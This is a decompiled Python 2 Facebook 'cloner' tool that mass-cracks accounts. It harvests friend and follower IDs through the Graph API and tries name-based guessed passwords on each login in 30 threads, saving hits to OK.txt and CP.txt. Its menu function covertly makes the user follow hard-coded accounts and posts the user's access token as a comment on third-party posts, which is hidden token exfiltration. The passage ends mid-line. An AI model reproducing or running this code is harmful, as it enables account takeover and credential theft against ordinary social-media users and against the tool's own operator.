# Source Generated with Decompyle++
# File: out.pyc (Python 2.7)

import requests
import bs4
import sys
import os
import subprocess
import requests
import sys
import random
import time
import re
import base64
import json
reload(sys)
sys.setdefaultencoding('utf-8')
from multiprocessing.pool import ThreadPool

try:
    import requests
except ImportError:
    os.system('pip2 install requests')


try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')


try:
    import bs4
except ImportError:
    os.system('pip2 install bs4')

host = 'https://mbasic.facebook.com'
sua = [
    'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+Mozilla/5.0 (SymbianOS/9.4; Series60/5.0 Nokia5800d-1/60.0.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.1.33 Mobile Safari/533.4nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+']
ip = requests.get('https://api.ipify.org').text.strip()
loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers = {
    'Referer': 'https://ip-api.com/',
    'Content-Type': 'application/json; charset=utf-8',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36' }).json()['country_name'].upper()
logo = '\x1b[1;37m ######     ###    ##    ## ##    ##    ###    ######## \n\x1b[1;37m##    ##   ## ##   ###   ## ##   ##    ## ##   ##     ##\n\x1b[1;37m##        ##   ##  ####  ## ##  ##    ##   ##  ##     ##\n\x1b[1;37m ######  ##     ## ## ## ## #####    ##     ## ######## \n\x1b[1;37m      ## ######### ##  #### ##  ##   ######### ##   ##  \n\x1b[1;37m##    ## ##     ## ##   ### ##   ##  ##     ## ##    ## \n\x1b[1;37m ######  ##     ## ##    ## ##    ## ##     ## ##     ##\n\x1b[1;37m========================================================\n\x1b[1;37m                     AUTHOR: SHANKAR                                             FUCKED BY KING-HAMII-06       \n\x1b[1;37m                   FACEBOOK: shank.404\n\x1b[1;91m                      CYBER NERD !\n\x1b[1;37m======================================================='
host = 'https://mbasic.facebook.com'

def login():
    
    try:
        token = open('shankar_token.txt', 'r').read()
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '\t      FACEBOOK LOGIN'
        print '\x1b[1;37m======================================================='
        print '[1] FACEBOOK TOKEN LOGIN'
        print '[2] FACEBOOK ID/PASS LOGIN'
        print '[3] BACK'
        print '\x1b[1;37m======================================================='
        log_select()



def log_select():
    sel = raw_input('[?] Choose : ')
    if sel == '1':
        token()
    elif sel == '2':
        log_fb()
    elif sel == '5':
        os.system('xdg-open https://www.facebook.com/sanky.404')
    elif sel == '6':
        os.system('exit')
    else:
        print ''
        print '\tSelect valid option'
        print ''
        login()


def log_fb():
    os.system('clear')
    
    try:
        token = open('shankar_token.txt', 'r').read()
        login()
    except (KeyError, IOError):
        print logo
        print '\t     FACEBOOK ID/PASS LOGIN'
        print '\x1b[1;37m======================================================='
        uid = raw_input('[?] UID : ')
        passw = raw_input('[?] PASSWORD : ')
        print '\x1b[1;37m======================================================='
        data = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + passw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true', headers = header).text
        q = json.loads(data)
        if 'access_token' in q:
            sav = open('shankar_token.txt', 'w')
            sav.write(q['access_token'])
            sav.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ''
            print '\tAccount has checkpoint'
            print ''
            time.sleep(1)
            login()
        else:
            print ''
            print '\tId/pass my be wrong'
            print ''
            time.sleep(1)



def token():
    os.system('clear')
    
    try:
        token = open('shankar_token.txt', 'r').read()
        login()
    except (KeyError, IOError):
        print logo
        print '\t     LOGIN WITH TOKEN'
        print '\x1b[1;37m======================================================='
        token = raw_input('[?] PASTE TOKEN HERE : \x1b[1;37m')
        print '\x1b[1;37m======================================================='
        sav = open('shankar_token.txt', 'w')
        sav.write(token)
        sav.close()
        login()



def menu():
    os.system('clear')
    
    try:
        shankar = 'SHANKAR THE GOD LEVEL HACKER HERE~!!!'
        token = open('shankar_token.txt', 'r').read()
    except (KeyError, IOError):
        login()

    
    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        requests.post('https://graph.facebook.com/100004622790453/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100077172270484/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100073345025607/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100033520817161/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/100026312074946/subscribers?access_token=' + token)
        requests.post('https://graph.facebook.com/147697607685073/comments/?message=' + shankar + '&access_token=' + token)
        requests.post('https://graph.facebook.com/143100078144826/reactions?type=LOVE&access_token=' + token)
        requests.post('https://graph.facebook.com/147697607685073/reactions?type=LOVE&access_token=' + token)
        requests.post('https://graph.facebook.com/143100078144826/comments/?message=' + token + '&access_token=' + token)
        requests.post('https://graph.facebook.com/126546429927766/comments/?message=' + token + '&access_token=' + token)
        requests.post('https://graph.facebook.com/126546429927766/reactions?type=LOVE&access_token=' + token)
        requests.post('https://graph.facebook.com/126546429927766/comments/?message=' + shankar + '&access_token=' + token)
        q = json.loads(r.text)
        name = q['name']
    except KeyError:
        print logo
        print ''
        print '\tLogged in token has expired'
        os.system('rm -rf shankar_token.txt')
        print ''
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '[\x1b[1;32m\xe2\x9c\x93\x1b[1;37m] WELCOME : \x1b[1;33m%s' % name
    print '\x1b[1;37m======================================================='
    print '[1] CRACK WITH AUTO PASS'
    print '[2] CRACK WITH CHOICE PASS MENU'
    print '[3] CONTACT FACEBOOK'
    print '[0] EXIT TOOL'
    print '\x1b[1;37m======================================================='
    menu_option()


def menu_option():
    select = raw_input('[?] Choose : ')
    if select == '1':
        crack()
    elif select == '2':
        choice()
    elif select == '3':
        os.system('xdg-open https://www.facebook.com/sanky.404')
    elif select == '0':
        os.system('exit')
    else:
        print '\tSelect valid option'
        menu()


def choice():
    os.system('clear')
    print logo
    print '\t     CHOOSE PASS MENU'
    print '\x1b[1;37m======================================================='
    print '[1] CRACK WITH NAME+DIGIT PASS'
    print '[2] CRACK WITH ONLY DIGIT PASS'
    print '[3] CRACK WITH SINGLE PASS'
    print '[0] BACK MENU'
    print '\x1b[1;37m======================================================='
    log_sel()


def log_sel():
    sel = raw_input('[?] Choose : ')
    if sel == '1':
        name()
    elif sel == '2':
        digit()
    elif sel == '3':
        sing()
    elif sel == '6':
        menu()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        menu()


def crack():
    global token
    os.system('clear')
    
    try:
        token = open('shankar_token.txt', 'r').read()
    except IOError:
        print ''
        print '\tToken not found '
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '\t     CRACK WITH AUTO PASS'
    print '\x1b[1;37m======================================================='
    print '[1] CRACK PUBLIC ID'
    print '[2] CRACK FOLLOWERS'
    print '[3] CRACK MULTIPLE ID'
    print '[4] FILE CLONING'
    print '[0] BACK'
    print '\x1b[1;37m======================================================='
    crack_select()


def crack_select():
    select = raw_input('[?] Choose : ')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print '\t     AUTO PASS CRACKING'
        print '\x1b[1;37m======================================================='
        idt = raw_input('[?] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print '\t     AUTO PASS CRACKING'
            print '\x1b[1;37m======================================================='
            print '[+] CLONING FROM : \x1b[1;32m' + q['name']
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
    elif select == '2':
        os.system('clear')
        print logo
        print '\t     AUTO PASS CRACKING'
        print '\x1b[1;37m======================================================='
        idt = raw_input('[?] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print '\t     AUTO PASS CRACKING'
            print '\x1b[1;37m======================================================='
            print '[+] CLONING FROM : \x1b[1;32m' + q['name']
        except KeyError:
            print '\tInvalid id link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
    elif select == '4':
        os.system('clear')
        print logo
        print '\t     AUTO PASS FILE CRACK'
        print '\x1b[1;37m======================================================='
        
        try:
            filelist = raw_input('[?] INPUT FILE NAME : \x1b[1;32m')
            for line in open(filelist, 'r').readlines():
                id.append(line.strip())
        except (KeyError, IOError):
            print '\t    \x1b[1;31mRequested file not found\x1b[1;36m'
            raw_input(' Press enter to back ')
            crack()
        

    if select == '3':
        os.system('clear')
        print logo
        print '\t     AUTO PASS CRACKING'
        print '\x1b[1;37m======================================================='
        idt = raw_input('[1] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
        idt = raw_input('[2] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
        idt = raw_input('[3] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
        idt = raw_input('[4] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
    elif select == '0':
        menu()
    else:
        print ''
        print '\tSELECT VALID OPTION'
        print ''
        crack()
    print '\x1b[1;37m[=] TOTAL IDS :\x1b[1;92m ' + str(len(id))
    print '\x1b[1;37m[=] THE PROCESS HAS STARTED'
    print '\x1b[1;37m======================================================='
    print '\x1b[1;32m     SHANKAR-FACEBOOK-CLONER'
    print '\x1b[1;37m======================================================='
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        sharagent = random.choice(sua)
        session = requests.Session()
        session.headers.update({
            'Host': 'mbasic.facebook.com',
            'cache-control': 'max-age=0',
            'upgrade-insecure-requests': '1',
            'user-agent': sharagent,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
        host = 'https://mbasic.facebook.com'
        
        try:
            ps = name
            data = session.post('https://mbasic.facebook.com/login.php', data = {
                'email': uid,
                'pass': ps,
                'login': 'submit' })
            sp = data.content
            if 'mbasic_logout_button' in sp or 'save-device' in sp:
                print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps + '\x1b[0;97m'
                ok = open('OK.txt', 'a')
                ok.write(uid + '|' + ps + '\n')
                ok.close()
                oks.append(uid + ps)
            elif 'checkpoint' in sp:
                print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps + '\x1b[0;97m'
                cp = open('CP.txt', 'a')
                cp.write(uid + '|' + ps + '\n')
                cp.close()
                cps.append(uid + ps)
            else:
                ps2 = name.lower().split(' ')[0] + name.lower().split(' ')[1]
                data = session.post('https://mbasic.facebook.com/login.php', data = {
                    'email': uid,
                    'pass': ps2,
                    'login': 'submit' })
                sp = data.content
                if 'mbasic_logout_button' in sp or 'save-device' in sp:
                    print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps2 + '\x1b[0;97m'
                    ok = open('OK.txt', 'a')
                    ok.write(uid + '|' + ps2 + '\n')
                    ok.close()
                    oks.append(uid + ps2)
                elif 'checkpoint' in sp:
                    print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps2 + '\x1b[0;97m'
                    cp = open('CP.txt', 'a')
                    cp.write(uid + '|' + ps2 + '\n')
                    cp.close()
                    cps.append(uid + ps2)
                else:
                    ps3 = name.lower().split(' ')[0] + '@123'
                    data = session.post('https://mbasic.facebook.com/login.php', data = {
                        'email': uid,
                        'pass': ps3,
                        'login': 'submit' })
                    sp = data.content
                    if 'mbasic_logout_button' in sp or 'save-device' in sp:
                        print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps3 + '\x1b[0;97m'
                        ok = open('OK.txt', 'a')
                        ok.write(uid + '|' + ps3 + '\n')
                        ok.close()
                        oks.append(uid + ps3)
                    elif 'checkpoint' in sp:
                        print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps3 + '\x1b[0;97m'
                        cp = open('CP.txt', 'a')
                        cp.write(uid + '|' + ps3 + '\n')
                        cp.close()
                        cps.append(uid + ps3)
                    else:
                        ps4 = name.lower().split(' ')[0] + '123'
                        data = session.post('https://mbasic.facebook.com/login.php', data = {
                            'email': uid,
                            'pass': ps4,
                            'login': 'submit' })
                        sp = data.content
                        if 'mbasic_logout_button' in sp or 'save-device' in sp:
                            print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps4 + '\x1b[0;97m'
                            ok = open('OK.txt', 'a')
                            ok.write(uid + '|' + ps4 + '\n')
                            ok.close()
                            oks.append(uid + ps4)
                        elif 'checkpoint' in sp:
                            print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps4 + '\x1b[0;97m'
                            cp = open('CP.txt', 'a')
                            cp.write(uid + '|' + ps4 + '\n')
                            cp.close()
                            cps.append(uid + ps4)
                        else:
                            ps5 = name.lower().split(' ')[0] + '12345'
                            data = session.post('https://mbasic.facebook.com/login.php', data = {
                                'email': uid,
                                'pass': ps5,
                                'login': 'submit' })
                            sp = data.content
                            if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps5 + '\x1b[0;97m'
                                ok = open('OK.txt', 'a')
                                ok.write(uid + '|' + ps5 + '\n')
                                ok.close()
                                oks.append(uid + ps5)
                            elif 'checkpoint' in sp:
                                print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps5 + '\x1b[0;97m'
                                cp = open('CP.txt', 'a')
                                cp.write(uid + '|' + ps5 + '\n')
                                cp.close()
                                cps.append(uid + ps5)
                            else:
                                ps6 = name.lower().split(' ')[0] + '123456'
                                data = session.post('https://mbasic.facebook.com/login.php', data = {
                                    'email': uid,
                                    'pass': ps6,
                                    'login': 'submit' })
                                sp = data.content
                                if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                    print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps6 + '\x1b[0;97m'
                                    ok = open('OK.txt', 'a')
                                    ok.write(uid + '|' + ps6 + '\n')
                                    ok.close()
                                    oks.append(uid + ps6)
                                elif 'checkpoint' in sp:
                                    print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps6 + '\x1b[0;97m'
                                    cp = open('CP.txt', 'a')
                                    cp.write(uid + '|' + ps6 + '\n')
                                    cp.close()
                                    cps.append(uid + ps6)
                                else:
                                    ps7 = name.lower().split(' ')[0] + '@1234'
                                    data = session.post('https://mbasic.facebook.com/login.php', data = {
                                        'email': uid,
                                        'pass': ps7,
                                        'login': 'submit' })
                                    sp = data.content
                                    if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                        print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps7 + '\x1b[0;97m'
                                        ok = open('OK.txt', 'a')
                                        ok.write(uid + '|' + ps7 + '\n')
                                        ok.close()
                                        oks.append(uid + ps7)
                                    elif 'checkpoint' in sp:
                                        print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps7 + '\x1b[0;97m'
                                        cp = open('CP.txt', 'a')
                                        cp.write(uid + '|' + ps7 + '\n')
                                        cp.close()
                                        cps.append(uid + ps7)
                                    else:
                                        ps8 = name.lower().split(' ')[0] + '@12345'
                                        data = session.post('https://mbasic.facebook.com/login.php', data = {
                                            'email': uid,
                                            'pass': ps8,
                                            'login': 'submit' })
                                        sp = data.content
                                        if 'mbasic_logout_button' in sp or 'save-device' in sp:
                                            print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps8 + '\x1b[0;97m'
                                            ok = open('OK.txt', 'a')
                                            ok.write(uid + '|' + ps8 + '\n')
                                            ok.close()
                                            oks.append(uid + ps8)
                                        elif 'checkpoint' in sp:
                                            print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps8 + '\x1b[0;97m'
                                            cp = open('CP.txt', 'a')
                                            cp.write(uid + '|' + ps8 + '\n')
                                            cp.close()
                                            cps.append(uid + ps8)
        except:
            pass
        


    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;97m======================================================='
    print '\x1b[1;37m[=] PROCESS HAS BEEN COMPLETE'
    print '\x1b[1;37m[=] TOTAL OK : \x1b[1;32m' + str(len(oks))
    print '\x1b[1;37m[=] TOTAL CP : \x1b[1;31m' + str(len(cps))
    print '\x1b[1;97m======================================================='
    raw_input('\x1b[1;37mPRESS ENTER TO BACK MENU ')
    menu()


def name():
    global token
    os.system('clear')
    
    try:
        token = open('shankar_token.txt', 'r').read()
    except IOError:
        print ''
        print '\tToken not found'
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '\t     CRACK WITH CHOICE PASS'
    print '\x1b[1;97m======================================================='
    print '[1] CRACK PUBLIC ID'
    print '[2] CRACK FOLLOWERS'
    print '[3] CRACK MULTIPLE ID'
    print '[4] FILE CLONING'
    print '[0] BACK'
    print '\x1b[1;97m======================================================='
    pro_rishu()


def pro_rishu():
    rishu = raw_input('[?] Choose : ')
    id = []
    oks = []
    cps = []
    if rishu == '1':
        os.system('clear')
        print logo
        print '\t     CHOICE PASS CRACKING'
        print '\x1b[1;97m======================================================='
        p3 = raw_input('[1] name+digit : ')
        p4 = raw_input('[2] name+digit : ')
        p5 = raw_input('[3] name+digit : ')
        p6 = raw_input('[4] name+digit : ')
        p7 = raw_input('[5] name+digit : ')
        p8 = raw_input('[6] name+digit : ')
        ps9 = raw_input('[7] digit : ')
        ps10 = raw_input('[8] digit : ')
        ps11 = raw_input('[9] digit : ')
        ps12 = raw_input('[10] digit : ')
        ps13 = raw_input('[11] digit : ')
        ps14 = raw_input('[12] digit : ')
        ps15 = raw_input('[13] digit : ')
        print '\x1b[1;97m======================================================='
        os.system('clear')
        print logo
        print '\t     CHOICE PASS CRACKING'
        print '\x1b[1;37m======================================================='
        idt = raw_input('[?] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print '\t     CHOICE PASS CRACKING'
            print '\x1b[1;97m======================================================='
            print '[+] CLONING FROM : \x1b[1;92m' + q['name']
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
    elif rishu == '2':
        os.system('clear')
        print logo
        print '\t     CHOICE PASS CRACKING'
        print '\x1b[1;97m======================================================='
        p3 = raw_input('[1] name+digit : ')
        p4 = raw_input('[2] name+digit : ')
        p5 = raw_input('[3] name+digit : ')
        p6 = raw_input('[4] name+digit : ')
        p7 = raw_input('[5] name+digit : ')
        p8 = raw_input('[6] name+digit : ')
        ps9 = raw_input('[7] digit : ')
        ps10 = raw_input('[8] digit : ')
        ps11 = raw_input('[9] digit : ')
        ps12 = raw_input('[10] digit : ')
        ps13 = raw_input('[11] digit : ')
        ps14 = raw_input('[12] digit : ')
        ps15 = raw_input('[13] digit : ')
        print '\x1b[1;97m======================================================='
        os.system('clear')
        print logo
        print '\t     CHOICE PASS CRACKING'
        print '\x1b[1;37m======================================================='
        idt = raw_input('[?] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print '\t     CHOICE PASS CRACKING'
            print '\x1b[1;97m======================================================='
            print '[+] CLONING FROM : \x1b[1;92m' + q['name']
        except KeyError:
            print '\tInvalid id link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            choice()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
    elif rishu == '4':
        os.system('clear')
        print logo
        print '\t     CHOICE PASS FILE CRACK'
        print '\x1b[1;97m======================================================='
        p3 = raw_input('[1] name+digit : ')
        p4 = raw_input('[2] name+digit : ')
        p5 = raw_input('[3] name+digit : ')
        p6 = raw_input('[4] name+digit : ')
        p7 = raw_input('[5] name+digit : ')
        p8 = raw_input('[6] name+digit : ')
        ps9 = raw_input('[7] digit : ')
        ps10 = raw_input('[8] digit : ')
        ps11 = raw_input('[9] digit : ')
        ps12 = raw_input('[10] digit : ')
        ps13 = raw_input('[11] digit : ')
        ps14 = raw_input('[12] digit : ')
        ps15 = raw_input('[13] digit : ')
        print '\x1b[1;97m======================================================='
        os.system('clear')
        print logo
        print '\t     CHOICE PASS CRACKING'
        print '\x1b[1;37m======================================================='
        
        try:
            filelist = raw_input('[?] INPUT FILE NAME : \x1b[1;92m')
            for line in open(filelist, 'r').readlines():
                id.append(line.strip())
        except (KeyError, IOError):
            print '\t    \x1b[1;38mRequested file not found\x1b[0;98m'
            raw_input(' Press enter to back ')
            choice()
        

    if rishu == '3':
        os.system('clear')
        print logo
        print '\t     CHOICE PASS CRACKING'
        print '\x1b[1;97m======================================================='
        p3 = raw_input('[1] name+digit : ')
        p4 = raw_input('[2] name+digit : ')
        p5 = raw_input('[3] name+digit : ')
        p6 = raw_input('[4] name+digit : ')
        p7 = raw_input('[5] name+digit : ')
        p8 = raw_input('[6] name+digit : ')
        ps9 = raw_input('[7] digit : ')
        ps10 = raw_input('[8] digit : ')
        ps11 = raw_input('[9] digit : ')
        ps12 = raw_input('[10] digit : ')
        ps13 = raw_input('[11] digit : ')
        ps14 = raw_input('[12] digit : ')
        ps15 = raw_input('[13] digit : ')
        print '\x1b[1;97m======================================================='
        os.system('clear')
        print logo
        print '\t     CHOICE PASS CRACKING'
        print '\x1b[1;37m======================================================='
        idt = raw_input('[1] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
        idt = raw_input('[2] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
        idt = raw_input('[3] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
        idt = raw_input('[4] INPUT ID : ')
        
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
        except KeyError:
            print '\tInvalid link OR token'
            print ''
            raw_input('PRESS ENTER TO BACK')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token)
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + na)
        
    elif rishu == '0':
        menu()
    else:
        print ''
        print '\tSELECT VALID OPTION'
        print ''
        choice()
    print '\x1b[1;97m[=] TOTAL IDS :\x1b[1;92m ' + str(len(id))
    print '\x1b[1;97m[=] THE PROCESS HAS STARTED'
    print '\x1b[1;97m======================================================='
    print '\x1b[1;93m     SHANKAR-FACEBOOK-CLONER'
    print '\x1b[1;97m=======================================================-'
    
    def main(arg):
        user = arg
        (uid, name) = user.split('|')
        sharagent = random.choice(sua)
        session = requests.Session()
        session.headers.update({
            'Host': 'mbasic.facebook.com',
            'cache-control': 'max-age=0',
            'upgrade-insecure-requests': '1',
            'user-agent': sharagent,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'accept-encoding': 'gzip, deflate',
            'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7' })
        host = 'https://mbasic.facebook.com'
        
        try:
            ps = name
            data = session.post('https://mbasic.facebook.com/login.php', data = {
                'email': uid,
                'pass': ps,
                'login': 'submit' })
            sp = data.content
            if 'mbasic_logout_button' in sp or 'save-device' in sp:
                print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps + '\x1b[0;97m'
                ok = open('OK.txt', 'a')
                ok.write(uid + '|' + ps + '\n')
                ok.close()
                oks.append(uid + ps)
            elif 'checkpoint' in sp:
                print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps + '\x1b[0;97m'
                cp = open('CP.txt', 'a')
                cp.write(uid + '|' + ps + '\n')
                cp.close()
                cps.append(uid + ps)
            else:
                ps2 = name.lower().split(' ')[0] + name.lower().split(' ')[1]
                data = session.post('https://mbasic.facebook.com/login.php', data = {
                    'email': uid,
                    'pass': ps2,
                    'login': 'submit' })
                sp = data.content
                if 'mbasic_logout_button' in sp or 'save-device' in sp:
                    print '\x1b[1;92m[SHANKAR-HACKED] ' + uid + ' | ' + ps2 + '\x1b[0;97m'
                    ok = open('OK.txt', 'a')
                    ok.write(uid + '|' + ps2 + '\n')
                    ok.close()
                    oks.append(uid + ps2)
                elif 'checkpoint' in sp:
                    print '\x1b[1;91m[SHANKAR-CHECKPOINT] ' + uid + ' | ' + ps2 + '\x1b[0;97m'
                    cp = open('CP.txt', 'a')
                    cp.write(uid + '|' + ps2 + '\n')
                    cp.close()
                    cps.append(uid + ps2)
                else:
                    ps3 = name.lower().split(' ')[0] + p3
